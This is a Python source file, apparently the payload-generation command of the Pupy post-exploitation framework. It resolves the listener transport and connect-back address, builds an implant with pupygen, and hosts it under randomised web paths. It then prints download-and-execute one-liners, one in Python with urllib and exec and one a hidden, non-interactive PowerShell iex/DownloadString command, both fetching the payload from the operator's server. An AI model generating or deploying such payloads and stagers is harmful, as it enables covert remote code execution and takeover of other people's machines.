# -*- encoding: utf-8 -*-

import os

from pupylib.PupyModule import PupyArgumentParser
from pupylib.PupyOutput import Info, Warn, Success, Error

from pupylib.utils.network import get_listener_ip, get_listener_port
from pupylib.utils.network import get_listener_ip_with_local

import pupygen

usage  = 'Generate payload'

def parser(server, handler, config):
    return pupygen.get_parser(PupyArgumentParser, config=config)

def do(server, handler, config, args):
    if not args.launcher or (args.launcher and args.launcher in ('connect', 'auto_proxy')):
        args.launcher = args.launcher or 'connect'
        transport = None
        transport_idx = None
        host = None
        host_idx = None
        port = None
        preferred_ok = True

        need_transport = False
        need_hostport = False

        if args.launcher_args:
            total = len(args.launcher_args)
            for idx,arg in enumerate(args.launcher_args):
                if arg == '-t' and idx < total-1:
                    transport = args.launcher_args[idx+1]
                    transport_idx = idx+1
                elif arg == '--host' and idx<total-1:
                    host_idx = idx+1
                    hostport = args.launcher_args[host_idx]
                    if ':' in hostport:
                        host, port = hostport.rsplit(':', 1)
                        port = int(port)
                    else:
                        try:
                            port = int(hostport)
                        except:
                            host = hostport

        need_transport = not bool(transport)
        need_hostport = not all([host, port])

        if not all([host, port, transport]):
            default_listener = None
            preferred_ok = False

            if transport:
                default_listener = server.listeners.get(transport)
                if not default_listener:
                    handler.display(Error(
                        'Requested transport {} is not active. Will use default'.format(
                            transport)))

                    need_transport = True

            if not default_listener:
                try:
                    default_listener = next(server.listeners.itervalues())
                except StopIteration:
                    pass

            if default_listener:
                transport = default_listener.name

                handler.display(Info(
                    'Connection point: Transport={} Address={}:{}'.format(
                        default_listener.name, default_listener.external,
                        default_listener.external_port)))

                if host or port:
                    handler.display(Warn('Host and port will be ignored'))

                if args.prefer_external != default_listener.local:
                    host = default_listener.external
                    port = default_listener.external_port
                    preferred_ok = True
                elif not args.prefer_external and not default_listener.local:
                    host = get_listener_ip(cache=False)
                    if host:
                        handler.display(Warn('Using {} as local IP'.format(host)))

                    port = default_listener.port
                    preferred_ok = True
                else:
                    preferred_ok = not (default_listener.local and args.prefer_external)

        if not transport:
            handler.display(Error('No active transports. Explicitly choose one'))
            return

        if not all([host, port, preferred_ok]):
            maybe_port = get_listener_port(config, external=args.prefer_external)
            maybe_host, local = get_listener_ip_with_local(
                external=args.prefer_external,
                config=config, igd=server.igd
            )

            if (not local and args.prefer_external) or not (host and port):
                handler.display(Warn('Using configured/discovered external HOST:PORT'))
                host = maybe_host
                port = maybe_port
            else:
                handler.display(Warn('Unable to find external HOST:PORT'))

        if need_transport:
            if transport_idx is None:
                args.launcher_args += ['-t', transport]
            else:
                args.launcher_args[transport_idx] = transport

        if need_hostport:
            hostport = '{}:{}'.format(host, port)
            if host_idx is None:
                args.launcher_args += ['--host', hostport]
            else:
                args.launcher_args[host_idx] = hostport

    if server.httpd:
        wwwroot = config.get_folder('wwwroot')
        if not args.output_dir:
            args.output_dir = wwwroot

    try:
        output = pupygen.pupygen(args, config, server, handler.display)

    except pupygen.NoOutput:
        return

    except Exception, e:
        handler.display(Error(e, 'payload generation failed'))
        import traceback
        traceback.print_exc()
        return

    if not output and 'oneliner' not in args.format:
        handler.display(Error('payload generation failed'))
        return

    if server.httpd and output.startswith(wwwroot):
        wwwpath = os.path.relpath(output, wwwroot)
        if config.getboolean('httpd', 'secret'):
            wwwpath = '/'.join([
                config.get('randoms', 'wwwsecret', random=5)
            ] + [
                config.set('randoms', None, x, random=5) for x in wwwpath.split('/')
            ])

        handler.display(Success('WWW URI PATH: /{}'.format(wwwpath)))
        host="<host:port>"
        try:
            for i in range(0,len(args.launcher_args)):
                if args.launcher_args[i]=="--host":
                    host=args.launcher_args[i+1]
                    break
        except:
            pass

        if args.format=='py':
            handler.display(Success("ONELINER: python -c 'import urllib;exec urllib.urlopen(\"http://{}/{}\").read()'".format(host, wwwpath)))
        elif args.format=='ps1':
            handler.display(Success("ONELINER: powershell.exe -w hidden -noni -nop -c \"iex(New-Object System.Net.WebClient).DownloadString('http://{}/{}')\"".format(host, wwwpath)))
